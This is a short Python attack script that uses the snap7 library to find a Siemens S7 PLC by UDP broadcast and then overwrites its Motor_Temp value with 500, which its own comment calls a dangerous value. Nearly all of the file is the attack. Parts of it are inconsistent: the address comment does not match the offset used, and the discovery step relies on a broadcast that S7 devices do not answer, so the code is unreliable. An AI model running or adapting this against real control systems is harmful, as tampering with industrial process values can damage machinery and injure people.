import snap7
from snap7.util import *
import socket
import struct

def find_plc_ip():
    # Broadcast a message to find the PLC's IP address
    broadcast_ip = "255.255.255.255"
    port = 102  # Default Siemens S7 port
    message = b"PLC Discovery"

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(message, (broadcast_ip, port))

    # Wait for a response from the PLC
    sock.settimeout(5)
    try:
        data, addr = sock.recvfrom(1024)
        plc_ip = addr[0]
        print(f"Found PLC at IP: {plc_ip}")
        return plc_ip
    except socket.timeout:
        print("PLC not found on the network.")
        return None

def modify_motor_temp(plc_ip):
    # Connect to the PLC
    client = snap7.client.Client()
    client.connect(plc_ip, 0, 1)  # IP, Rack, Slot

    # Define the memory address of Motor_Temp (from the tag table)
    motor_temp_address = 7  # %MW7 corresponds to DB1.DBW14 in S7-1200

    # Read the current Motor_Temp value
    data = client.db_read(1, motor_temp_address, 2)  # Read 2 bytes from DB1
    current_temp = get_int(data, 0)
    print(f"Current Motor_Temp: {current_temp}")

    # Modify the Motor_Temp to a dangerous value (e.g., 500)
    new_temp = 500
    set_int(data, 0, new_temp)
    client.db_write(1, motor_temp_address, data)
    print(f"Modified Motor_Temp to: {new_temp}")

    # Disconnect from the PLC
    client.disconnect()

if __name__ == "__main__":
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    if plc_ip:
        # Step 2: Modify the Motor_Temp parameter
        modify_motor_temp(plc_ip)